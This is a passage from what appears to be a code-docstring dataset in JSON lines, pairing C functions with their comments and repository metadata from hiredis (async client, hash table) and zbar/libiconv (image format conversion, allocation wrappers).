!= NULL) {\n            sname = sdsnewlen(astr,alen);\n            if (sname == NULL)\n                goto oom;\n\n            if (pvariant)\n                cbdict = ac->sub.patterns;\n            else\n                cbdict = ac->sub.channels;\n\n            de = dictFind(cbdict,sname);\n\n            if (de != NULL) {\n                existcb = dictGetEntryVal(de);\n                cb.pending_subs = existcb->pending_subs + 1;\n            }\n\n            ret = dictReplace(cbdict,sname,&cb);\n\n            if (ret == 0) sdsfree(sname);\n        }\n    } else if (strncasecmp(cstr,\"unsubscribe\\r\\n\",13) == 0) {\n        /* It is only useful to call (P)UNSUBSCRIBE when the context is\n         * subscribed to one or more channels or patterns. */\n        if (!(c->flags & REDIS_SUBSCRIBED)) return REDIS_ERR;\n\n        /* (P)UNSUBSCRIBE does not have its own response: every channel or\n         * pattern that is unsubscribed will receive a message. This means we\n         * should not append a callback function for this command. */\n     } else if(strncasecmp(cstr,\"monitor\\r\\n\",9) == 0) {\n         /* Set monitor flag and push callback */\n         c->flags |= REDIS_MONITORING;\n         __redisPushCallback(&ac->replies,&cb);\n    } else {\n        if (c->flags & REDIS_SUBSCRIBED)\n            /* This will likely result in an error reply, but it needs to be\n             * received and passed to the callback. */\n            __redisPushCallback(&ac->sub.invalid,&cb);\n        else\n            __redisPushCallback(&ac->replies,&cb);\n    }\n\n    __redisAppendCommand(c,cmd,len);\n\n    /* Always schedule a write when the write buffer is non-empty */\n    _EL_ADD_WRITE(ac);\n\n    return REDIS_OK;\noom:\n    __redisSetError(&(ac->c), REDIS_ERR_OOM, \"Out of memory\");\n    return REDIS_ERR;\n}", "path": "hiredis/async.c", "commit_date": "2020-09-23 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Reset an hashtable already initialized with ht_init().\n * NOTE: This function should only called by ht_destroy(). */\n", "func_signal": "static void _dictReset(dict *ht)", "code": "{\n    ht->table = NULL;\n    ht->size = 0;\n    ht->sizemask = 0;\n    ht->used = 0;\n}", "path": "hiredis/dict.c", "commit_date": "2020-05-22 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Search and remove an element */\n", "func_signal": "static int dictDelete(dict *ht, const void *key)", "code": "{\n    unsigned int h;\n    dictEntry *de, *prevde;\n\n    if (ht->size == 0)\n        return DICT_ERR;\n    h = dictHashKey(ht, key) & ht->sizemask;\n    de = ht->table[h];\n\n    prevde = NULL;\n    while(de) {\n        if (dictCompareHashKeys(ht,key,de->key)) {\n            /* Unlink the element from the list */\n            if (prevde)\n                prevde->next = de->next;\n            else\n                ht->table[h] = de->next;\n\n            dictFreeEntryKey(ht,de);\n            dictFreeEntryVal(ht,de);\n            hi_free(de);\n            ht->used--;\n            return DICT_OK;\n        }\n        prevde = de;\n        de = de->next;\n    }\n    return DICT_ERR; /* not found */\n}", "path": "hiredis/dict.c", "commit_date": "2020-05-22 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Generic hash function (a popular one from Bernstein).\n * I tested a few and this was the best. */\n", "func_signal": "static unsigned int dictGenHashFunction(const unsigned char *buf, int len)", "code": "{\n    unsigned int hash = 5381;\n\n    while (len--)\n        hash = ((hash << 5) + hash) + (*buf++); /* hash * 33 + c */\n    return hash;\n}", "path": "hiredis/dict.c", "commit_date": "2020-05-22 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Helper function to make the disconnect happen and clean up. */\n", "func_signal": "void __redisAsyncDisconnect(redisAsyncContext *ac)", "code": "{\n    redisContext *c = &(ac->c);\n\n    /* Make sure error is accessible if there is any */\n    __redisAsyncCopyError(ac);\n\n    if (ac->err == 0) {\n        /* For clean disconnects, there should be no pending callbacks. */\n        int ret = __redisShiftCallback(&ac->replies,NULL);\n        assert(ret == REDIS_ERR);\n    } else {\n        /* Disconnection is caused by an error, make sure that pending\n         * callbacks cannot call new commands. */\n        c->flags |= REDIS_DISCONNECTING;\n    }\n\n    /* cleanup event library on disconnect.\n     * this is safe to call multiple times */\n    _EL_CLEANUP(ac);\n\n    /* For non-clean disconnects, __redisAsyncFree() will execute pending\n     * callbacks with a NULL-reply. */\n    if (!(c->flags & REDIS_NO_AUTO_FREE)) {\n      __redisAsyncFree(ac);\n    }\n}", "path": "hiredis/async.c", "commit_date": "2020-09-23 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Helper function to free the context. */\n", "func_signal": "static void __redisAsyncFree(redisAsyncContext *ac)", "code": "{\n    redisContext *c = &(ac->c);\n    redisCallback cb;\n    dictIterator *it;\n    dictEntry *de;\n\n    /* Execute pending callbacks with NULL reply. */\n    while (__redisShiftCallback(&ac->replies,&cb) == REDIS_OK)\n        __redisRunCallback(ac,&cb,NULL);\n\n    /* Execute callbacks for invalid commands */\n    while (__redisShiftCallback(&ac->sub.invalid,&cb) == REDIS_OK)\n        __redisRunCallback(ac,&cb,NULL);\n\n    /* Run subscription callbacks with NULL reply */\n    if (ac->sub.channels) {\n        it = dictGetIterator(ac->sub.channels);\n        if (it != NULL) {\n            while ((de = dictNext(it)) != NULL)\n                __redisRunCallback(ac,dictGetEntryVal(de),NULL);\n            dictReleaseIterator(it);\n        }\n\n        dictRelease(ac->sub.channels);\n    }\n\n    if (ac->sub.patterns) {\n        it = dictGetIterator(ac->sub.patterns);\n        if (it != NULL) {\n            while ((de = dictNext(it)) != NULL)\n                __redisRunCallback(ac,dictGetEntryVal(de),NULL);\n            dictReleaseIterator(it);\n        }\n\n        dictRelease(ac->sub.patterns);\n    }\n\n    /* Signal event lib to clean up */\n    _EL_CLEANUP(ac);\n\n    /* Execute disconnect callback. When redisAsyncFree() initiated destroying\n     * this context, the status will always be REDIS_OK. */\n    if (ac->onDisconnect && (c->flags & REDIS_CONNECTED)) {\n        if (c->flags & REDIS_FREEING) {\n            ac->onDisconnect(ac,REDIS_OK);\n        } else {\n            ac->onDisconnect(ac,(ac->err == 0) ? REDIS_OK : REDIS_ERR);\n        }\n    }\n\n    if (ac->dataCleanup) {\n        ac->dataCleanup(ac->data);\n    }\n\n    /* Cleanup self */\n    redisFree(c);\n}", "path": "hiredis/async.c", "commit_date": "2020-09-23 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Returns the index of a free slot that can be populated with\n * an hash entry for the given 'key'.\n * If the key already exists, -1 is returned. */\n", "func_signal": "static int _dictKeyIndex(dict *ht, const void *key)", "code": "{\n    unsigned int h;\n    dictEntry *he;\n\n    /* Expand the hashtable if needed */\n    if (_dictExpandIfNeeded(ht) == DICT_ERR)\n        return -1;\n    /* Compute the key hash value */\n    h = dictHashKey(ht, key) & ht->sizemask;\n    /* Search if this slot does not already contain the given key */\n    he = ht->table[h];\n    while(he) {\n        if (dictCompareHashKeys(ht, key, he->key))\n            return -1;\n        he = he->next;\n    }\n    return h;\n}", "path": "hiredis/dict.c", "commit_date": "2020-05-22 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Sets a pointer to the first argument and its length starting at p. Returns\n * the number of bytes to skip to get to the following argument. */\n", "func_signal": "static const char *nextArgument(const char *start, const char **str, size_t *len)", "code": "{\n    const char *p = start;\n    if (p[0] != '$') {\n        p = strchr(p,'$');\n        if (p == NULL) return NULL;\n    }\n\n    *len = (int)strtol(p+1,NULL,10);\n    p = strchr(p,'\\r');\n    assert(p);\n    *str = p+2;\n    return p+2+(*len)+2;\n}", "path": "hiredis/async.c", "commit_date": "2020-09-23 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* This function should be called when the socket is readable.\n * It processes all replies that can be read and executes their callbacks.\n */\n", "func_signal": "void redisAsyncHandleRead(redisAsyncContext *ac)", "code": "{\n    redisContext *c = &(ac->c);\n\n    if (!(c->flags & REDIS_CONNECTED)) {\n        /* Abort connect was not successful. */\n        if (__redisAsyncHandleConnect(ac) != REDIS_OK)\n            return;\n        /* Try again later when the context is still not connected. */\n        if (!(c->flags & REDIS_CONNECTED))\n            return;\n    }\n\n    c->funcs->async_read(ac);\n}", "path": "hiredis/async.c", "commit_date": "2020-09-23 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Destroy an entire hash table */\n", "func_signal": "static int _dictClear(dict *ht)", "code": "{\n    unsigned long i;\n\n    /* Free all the elements */\n    for (i = 0; i < ht->size && ht->used > 0; i++) {\n        dictEntry *he, *nextHe;\n\n        if ((he = ht->table[i]) == NULL) continue;\n        while(he) {\n            nextHe = he->next;\n            dictFreeEntryKey(ht, he);\n            dictFreeEntryVal(ht, he);\n            hi_free(he);\n            ht->used--;\n            he = nextHe;\n        }\n    }\n    /* Free the table and the allocated cache structure */\n    hi_free(ht->table);\n    /* Re-initialize the table */\n    _dictReset(ht);\n    return DICT_OK; /* never fails */\n}", "path": "hiredis/dict.c", "commit_date": "2020-05-22 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Our hash table capability is a power of two */\n", "func_signal": "static unsigned long _dictNextPower(unsigned long size)", "code": "{\n    unsigned long i = DICT_HT_INITIAL_SIZE;\n\n    if (size >= LONG_MAX) return LONG_MAX;\n    while(1) {\n        if (i >= size)\n            return i;\n        i *= 2;\n    }\n}", "path": "hiredis/dict.c", "commit_date": "2020-05-22 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Clear & Release the hash table */\n", "func_signal": "static void dictRelease(dict *ht)", "code": "{\n    _dictClear(ht);\n    hi_free(ht);\n}", "path": "hiredis/dict.c", "commit_date": "2020-05-22 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* We aren't actually freeing anything here, but it is included to show that we can\n * have hiredis call our data destructor when freeing the context */\n", "func_signal": "void privdata_dtor(void *privdata)", "code": "{\n    unsigned int *icount = privdata;\n    printf(\"privdata_dtor():  In context privdata dtor (invalidations: %u)\\n\", *icount);\n}", "path": "hiredis/examples/example-push.c", "commit_date": "2020-08-07 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Create a new hash table */\n", "func_signal": "static dict *dictCreate(dictType *type, void *privDataPtr)", "code": "{\n    dict *ht = hi_malloc(sizeof(*ht));\n    if (ht == NULL)\n        return NULL;\n\n    _dictInit(ht,type,privDataPtr);\n    return ht;\n}", "path": "hiredis/dict.c", "commit_date": "2020-05-22 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Internal helper function to detect socket status the first time a read or\n * write event fires. When connecting was not successful, the connect callback\n * is called with a REDIS_ERR status and the context is free'd. */\n", "func_signal": "static int __redisAsyncHandleConnect(redisAsyncContext *ac)", "code": "{\n    int completed = 0;\n    redisContext *c = &(ac->c);\n\n    if (redisCheckConnectDone(c, &completed) == REDIS_ERR) {\n        /* Error! */\n        redisCheckSocketError(c);\n        __redisAsyncHandleConnectFailure(ac);\n        return REDIS_ERR;\n    } else if (completed == 1) {\n        /* connected! */\n        if (c->connection_type == REDIS_CONN_TCP &&\n            redisSetTcpNoDelay(c) == REDIS_ERR) {\n            __redisAsyncHandleConnectFailure(ac);\n            return REDIS_ERR;\n        }\n\n        if (ac->onConnect) ac->onConnect(ac, REDIS_OK);\n        c->flags |= REDIS_CONNECTED;\n        return REDIS_OK;\n    } else {\n        return REDIS_OK;\n    }\n}", "path": "hiredis/async.c", "commit_date": "2020-09-23 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Allocate N bytes of memory dynamically, with error checking.  */\n", "func_signal": "void *\nxmalloc (size_t n)", "code": "{\n  void *p;\n\n  p = malloc (n);\n  if (p == NULL)\n    p = fixup_null_alloc (n);\n  return p;\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/libiconv-1.15/srclib/xmalloc.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* select least cost conversion from src format to available dsts */\n", "func_signal": "int _zbar_best_format (uint32_t src,\n                       uint32_t *dst,\n                       const uint32_t *dsts)", "code": "{\n    const zbar_format_def_t *srcfmt;\n    unsigned min_cost = -1;\n\n    if(dst)\n        *dst = 0;\n    if(!dsts)\n        return(-1);\n    if(has_format(src, dsts)) {\n        zprintf(8, \"shared format: %4.4s\\n\", (char*)&src);\n        if(dst)\n            *dst = src;\n        return(0);\n    }\n    srcfmt = _zbar_format_lookup(src);\n    if(!srcfmt)\n        return(-1);\n\n    zprintf(8, \"from %.4s(%08\" PRIx32 \") to\", (char*)&src, src);\n    for(; *dsts; dsts++) {\n        const zbar_format_def_t *dstfmt = _zbar_format_lookup(*dsts);\n        int cost;\n        if(!dstfmt)\n            continue;\n        if(srcfmt->group == dstfmt->group &&\n           srcfmt->p.cmp == dstfmt->p.cmp)\n            cost = 0;\n        else\n            cost = conversions[srcfmt->group][dstfmt->group].cost;\n\n        if(_zbar_verbosity >= 8)\n            fprintf(stderr, \" %.4s(%08\" PRIx32 \")=%d\",\n                    (char*)dsts, *dsts, cost);\n        if(cost >= 0 && min_cost > cost) {\n            min_cost = cost;\n            if(dst)\n                *dst = *dsts;\n        }\n    }\n    if(_zbar_verbosity >= 8)\n        fprintf(stderr, \"\\n\");\n    return(min_cost);\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* cleanup linked image by unrefing */\n", "func_signal": "static void cleanup_ref (zbar_image_t *img)", "code": "{\n    if(img->next)\n        _zbar_image_refcnt(img->next, -1);\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* resample and resize packed RGB components */\n", "func_signal": "static void convert_rgb_resample (zbar_image_t *dst,\n                                  const zbar_format_def_t *dstfmt,\n                                  const zbar_image_t *src,\n                                  const zbar_format_def_t *srcfmt)", "code": "{\n    unsigned long dstn = dst->width * dst->height;\n    uint8_t *dstp;\n    int drbits, drbit0, dgbits, dgbit0, dbbits, dbbit0;\n    int srbits, srbit0, sgbits, sgbit0, sbbits, sbbit0;\n    const uint8_t *srcp;\n    unsigned srcl, x, y;\n    uint32_t p = 0;\n\n    dst->datalen = dstn * dstfmt->p.rgb.bpp;\n    dst->data = malloc(dst->datalen);\n    if(!dst->data) return;\n    dstp = (void*)dst->data;\n\n    drbits = RGB_SIZE(dstfmt->p.rgb.red);\n    drbit0 = RGB_OFFSET(dstfmt->p.rgb.red);\n    dgbits = RGB_SIZE(dstfmt->p.rgb.green);\n    dgbit0 = RGB_OFFSET(dstfmt->p.rgb.green);\n    dbbits = RGB_SIZE(dstfmt->p.rgb.blue);\n    dbbit0 = RGB_OFFSET(dstfmt->p.rgb.blue);\n\n    assert(src->datalen >= (src->width * src->height * srcfmt->p.rgb.bpp));\n    srcp = src->data;\n\n    srbits = RGB_SIZE(srcfmt->p.rgb.red);\n    srbit0 = RGB_OFFSET(srcfmt->p.rgb.red);\n    sgbits = RGB_SIZE(srcfmt->p.rgb.green);\n    sgbit0 = RGB_OFFSET(srcfmt->p.rgb.green);\n    sbbits = RGB_SIZE(srcfmt->p.rgb.blue);\n    sbbit0 = RGB_OFFSET(srcfmt->p.rgb.blue);\n\n    srcl = src->width * srcfmt->p.rgb.bpp;\n    for(y = 0; y < dst->height; y++) {\n        if(y >= src->height)\n            y -= srcl;\n        for(x = 0; x < dst->width; x++) {\n            if(x < src->width) {\n                uint8_t r, g, b;\n                p = convert_read_rgb(srcp, srcfmt->p.rgb.bpp);\n                srcp += srcfmt->p.rgb.bpp;\n\n                /* FIXME endianness? */\n                r = (p >> srbit0) << srbits;\n                g = (p >> sgbit0) << sgbits;\n                b = (p >> sbbit0) << sbbits;\n\n                p = (((r >> drbits) << drbit0) |\n                     ((g >> dgbits) << dgbit0) |\n                     ((b >> dbbits) << dbbit0));\n            }\n            convert_write_rgb(dstp, p, dstfmt->p.rgb.bpp);\n            dstp += dstfmt->p.rgb.bpp;\n        }\n        if(x < src->width)\n            srcp += (src->width - x) * srcfmt->p.rgb.bpp;\n    }\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* split packed YUV samples and join into YUV planes\n * FIXME currently ignores color and grayscales the image\n */\n", "func_signal": "static void convert_yuv_unpack (zbar_image_t *dst,\n                                const zbar_format_def_t *dstfmt,\n                                const zbar_image_t *src,\n                                const zbar_format_def_t *srcfmt)", "code": "{\n    unsigned long dstn, dstm2;\n    uint8_t *dsty, flags;\n    const uint8_t *srcp;\n    unsigned srcl, x, y;\n    uint8_t y0 = 0, y1 = 0;\n\n    uv_roundup(dst, dstfmt);\n    dstn = dst->width * dst->height;\n    dstm2 = uvp_size(dst, dstfmt) * 2;\n    dst->datalen = dstn + dstm2;\n    dst->data = malloc(dst->datalen);\n    if(!dst->data) return;\n    if(dstm2)\n        memset((uint8_t*)dst->data + dstn, 0x80, dstm2);\n    dsty = (uint8_t*)dst->data;\n\n    flags = srcfmt->p.yuv.packorder ^ dstfmt->p.yuv.packorder;\n    flags &= 2;\n    srcp = src->data;\n    if(flags)\n        srcp++;\n\n    srcl = src->width + (src->width >> srcfmt->p.yuv.xsub2);\n    for(y = 0; y < dst->height; y++) {\n        if(y >= src->height)\n            srcp -= srcl;\n        for(x = 0; x < dst->width; x += 2) {\n            if(x < src->width) {\n                y0 = *(srcp++);  srcp++;\n                y1 = *(srcp++);  srcp++;\n            }\n            *(dsty++) = y0;\n            *(dsty++) = y1;\n        }\n        if(x < src->width)\n            srcp += (src->width - x) * 2;\n    }\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* packed RGB to packed YUV\n * FIXME currently ignores color and grayscales the image\n */\n", "func_signal": "static void convert_rgb_to_yuv (zbar_image_t *dst,\n                                const zbar_format_def_t *dstfmt,\n                                const zbar_image_t *src,\n                                const zbar_format_def_t *srcfmt)", "code": "{\n    uint8_t *dstp, flags;\n    const uint8_t *srcp;\n    int rbits, rbit0, gbits, gbit0, bbits, bbit0;\n    unsigned srcl, x, y;\n    uint16_t y0 = 0;\n\n    uv_roundup(dst, dstfmt);\n    dst->datalen = dst->width * dst->height + uvp_size(dst, dstfmt) * 2;\n    dst->data = malloc(dst->datalen);\n    if(!dst->data) return;\n    dstp = (void*)dst->data;\n    flags = dstfmt->p.yuv.packorder & 2;\n\n    assert(src->datalen >= (src->width * src->height * srcfmt->p.rgb.bpp));\n    srcp = src->data;\n\n    rbits = RGB_SIZE(srcfmt->p.rgb.red);\n    rbit0 = RGB_OFFSET(srcfmt->p.rgb.red);\n    gbits = RGB_SIZE(srcfmt->p.rgb.green);\n    gbit0 = RGB_OFFSET(srcfmt->p.rgb.green);\n    bbits = RGB_SIZE(srcfmt->p.rgb.blue);\n    bbit0 = RGB_OFFSET(srcfmt->p.rgb.blue);\n\n    srcl = src->width * srcfmt->p.rgb.bpp;\n    for(y = 0; y < dst->height; y++) {\n        if(y >= src->height)\n            srcp -= srcl;\n        for(x = 0; x < dst->width; x++) {\n            if(x < src->width) {\n                uint8_t r, g, b;\n                uint32_t p = convert_read_rgb(srcp, srcfmt->p.rgb.bpp);\n                srcp += srcfmt->p.rgb.bpp;\n\n                /* FIXME endianness? */\n                r = ((p >> rbit0) << rbits) & 0xff;\n                g = ((p >> gbit0) << gbits) & 0xff;\n                b = ((p >> bbit0) << bbits) & 0xff;\n\n                /* FIXME color space? */\n                y0 = ((77 * r + 150 * g + 29 * b) + 0x80) >> 8;\n            }\n            if(flags) {\n                *(dstp++) = 0x80;  *(dstp++) = y0;\n            }\n            else {\n                *(dstp++) = y0;  *(dstp++) = 0x80;\n            }\n        }\n        if(x < src->width)\n            srcp += (src->width - x) * srcfmt->p.rgb.bpp;\n    }\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* Allocate memory for N elements of S bytes, with error checking,\n   and zero it.  */\n", "func_signal": "void *\nxcalloc (size_t n, size_t s)", "code": "{\n  void *p;\n\n  p = calloc (n, s);\n  if (p == NULL)\n    p = fixup_null_alloc (n);\n  return p;\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/libiconv-1.15/srclib/xmalloc.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* Change the size of an allocated block of memory P to N bytes,\n   with error checking.\n   If P is NULL, run xmalloc.  */\n", "func_signal": "void *\nxrealloc (void *p, size_t n)", "code": "{\n  if (p == NULL)\n    return xmalloc (n);\n  p = realloc (p, n);\n  if (p == NULL)\n    p = fixup_null_alloc (n);\n  return p;\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/libiconv-1.15/srclib/xmalloc.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* verify that format list is in required sort order */\n", "func_signal": "static inline int verify_format_sort (void)", "code": "{\n    int i;\n    for(i = 0; i < num_format_defs; i++) {\n        int j = i * 2 + 1;\n        if((j < num_format_defs &&\n            format_defs[i].format < format_defs[j].format) ||\n           (j + 1 < num_format_defs &&\n            format_defs[j + 1].format < format_defs[i].format))\n            break;\n    }\n    if(i == num_format_defs)\n        return(0);\n\n    /* spew correct order for fix */\n    fprintf(stderr, \"ERROR: image format list is not sorted!?\\n\");\n\n#ifdef DEBUG_CONVERT\n    assert(num_format_defs);\n    uint32_t sorted[num_format_defs];\n    uint32_t ordered[num_format_defs];\n    for(i = 0; i < num_format_defs; i++)\n        sorted[i] = format_defs[i].format;\n    qsort(sorted, num_format_defs, sizeof(uint32_t), intsort);\n    for(i = 0; i < num_format_defs; i = i << 1 | 1);\n    i = (i - 1) / 2;\n    ordered[i] = sorted[0];\n    int j, k;\n    for(j = 1; j < num_format_defs; j++) {\n        k = i * 2 + 2;\n        if(k < num_format_defs) {\n            i = k;\n            for(k = k * 2 + 1; k < num_format_defs; k = k * 2 + 1)\n                i = k;\n        }\n        else {\n            for(k = (i - 1) / 2; i != k * 2 + 1; k = (i - 1) / 2) {\n                assert(i);\n                i = k;\n            }\n            i = k;\n        }\n        ordered[i] = sorted[j];\n    }\n    fprintf(stderr, \"correct sort order is:\");\n    for(i = 0; i < num_format_defs; i++)\n        fprintf(stderr, \" %4.4s\", (char*)&ordered[i]);\n    fprintf(stderr, \"\\n\");\n#endif\n    return(-1);\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* interleave YUV planes into packed YUV */\n", "func_signal": "static void convert_yuv_pack (zbar_image_t *dst,\n                              const zbar_format_def_t *dstfmt,\n                              const zbar_image_t *src,\n                              const zbar_format_def_t *srcfmt)", "code": "{\n    unsigned long srcm, srcn;\n    uint8_t flags, *srcy, *dstp;\n    const uint8_t *srcu, *srcv;\n    unsigned srcl, xmask, ymask, x, y;\n    uint8_t y0 = 0, y1 = 0, u = 0x80, v = 0x80;\n\n    uv_roundup(dst, dstfmt);\n    dst->datalen = dst->width * dst->height + uvp_size(dst, dstfmt) * 2;\n    dst->data = malloc(dst->datalen);\n    if(!dst->data) return;\n    dstp = (void*)dst->data;\n\n    srcm = uvp_size(src, srcfmt);\n    srcn = src->width * src->height;\n    assert(src->datalen >= srcn + 2 * srcn);\n    flags = dstfmt->p.yuv.packorder ^ srcfmt->p.yuv.packorder;\n    srcy = (void*)src->data;\n    if(flags & 1) {\n        srcv = (uint8_t*)src->data + srcn;\n        srcu = srcv + srcm;\n    } else {\n        srcu = (uint8_t*)src->data + srcn;\n        srcv = srcu + srcm;\n    }\n    flags = dstfmt->p.yuv.packorder & 2;\n\n    srcl = src->width >> srcfmt->p.yuv.xsub2;\n    xmask = (1 << srcfmt->p.yuv.xsub2) - 1;\n    ymask = (1 << srcfmt->p.yuv.ysub2) - 1;\n    for(y = 0; y < dst->height; y++) {\n        if(y >= src->height) {\n            srcy -= src->width;\n            srcu -= srcl;  srcv -= srcl;\n        }\n        else if(y & ymask) {\n            srcu -= srcl;  srcv -= srcl;\n        }\n        for(x = 0; x < dst->width; x += 2) {\n            if(x < src->width) {\n                y0 = *(srcy++);  y1 = *(srcy++);\n                if(!(x & xmask)) {\n                    u = *(srcu++);  v = *(srcv++);\n                }\n            }\n            if(flags) {\n                *(dstp++) = u;  *(dstp++) = y0;\n                *(dstp++) = v;  *(dstp++) = y1;\n            } else {\n                *(dstp++) = y0;  *(dstp++) = u;\n                *(dstp++) = y1;  *(dstp++) = v;\n            }\n        }\n        for(; x < src->width; x += 2) {\n            srcy += 2;\n            if(!(x & xmask)) {\n                srcu++;  srcv++;\n            }\n        }\n    }\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* packed YUV to packed RGB */\n", "func_signal": "static void convert_yuv_to_rgb (zbar_image_t *dst,\n                                const zbar_format_def_t *dstfmt,\n                                const zbar_image_t *src,\n                                const zbar_format_def_t *srcfmt)", "code": "{\n    uint8_t *dstp;\n    unsigned long dstn = dst->width * dst->height;\n    int drbits, drbit0, dgbits, dgbit0, dbbits, dbbit0;\n    const uint8_t *srcp;\n    unsigned srcl, x, y;\n    uint32_t p = 0;\n\n    dst->datalen = dstn * dstfmt->p.rgb.bpp;\n    dst->data = malloc(dst->datalen);\n    if(!dst->data) return;\n    dstp = (void*)dst->data;\n\n    drbits = RGB_SIZE(dstfmt->p.rgb.red);\n    drbit0 = RGB_OFFSET(dstfmt->p.rgb.red);\n    dgbits = RGB_SIZE(dstfmt->p.rgb.green);\n    dgbit0 = RGB_OFFSET(dstfmt->p.rgb.green);\n    dbbits = RGB_SIZE(dstfmt->p.rgb.blue);\n    dbbit0 = RGB_OFFSET(dstfmt->p.rgb.blue);\n\n    assert(src->datalen >= (src->width * src->height +\n                            uvp_size(src, srcfmt) * 2));\n    srcp = src->data;\n    if(srcfmt->p.yuv.packorder & 2)\n        srcp++;\n\n    assert(srcfmt->p.yuv.xsub2 == 1);\n    srcl = src->width + (src->width >> 1);\n    for(y = 0; y < dst->height; y++) {\n        if(y >= src->height)\n            srcp -= srcl;\n        for(x = 0; x < dst->width; x++) {\n            if(x < src->width) {\n                uint8_t y0 = *(srcp++);\n                srcp++;\n\n                if(y0 <= 16)\n                    y0 = 0;\n                else if(y0 >= 235)\n                    y0 = 255;\n                else\n                    y0 = (uint16_t)(y0 - 16) * 255 / 219;\n\n                p = (((y0 >> drbits) << drbit0) |\n                     ((y0 >> dgbits) << dgbit0) |\n                     ((y0 >> dbbits) << dbbit0));\n            }\n            convert_write_rgb(dstp, p, dstfmt->p.rgb.bpp);\n            dstp += dstfmt->p.rgb.bpp;\n        }\n        if(x < src->width)\n            srcp += (src->width - x) * 2;\n    }\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* packed RGB to YUV planes\n * FIXME currently ignores color and grayscales the image\n */\n", "func_signal": "static void convert_rgb_to_yuvp (zbar_image_t *dst,\n                                 const zbar_format_def_t *dstfmt,\n                                 const zbar_image_t *src,\n                                 const zbar_format_def_t *srcfmt)", "code": "{\n    unsigned long dstn, dstm2;\n    uint8_t *dsty;\n    const uint8_t *srcp;\n    int rbits, rbit0, gbits, gbit0, bbits, bbit0;\n    unsigned srcl, x, y;\n    uint16_t y0 = 0;\n\n    uv_roundup(dst, dstfmt);\n    dstn = dst->width * dst->height;\n    dstm2 = uvp_size(dst, dstfmt) * 2;\n    dst->datalen = dstn + dstm2;\n    dst->data = malloc(dst->datalen);\n    if(!dst->data) return;\n    if(dstm2)\n        memset((uint8_t*)dst->data + dstn, 0x80, dstm2);\n    dsty = (void*)dst->data;\n\n    assert(src->datalen >= (src->width * src->height * srcfmt->p.rgb.bpp));\n    srcp = src->data;\n\n    rbits = RGB_SIZE(srcfmt->p.rgb.red);\n    rbit0 = 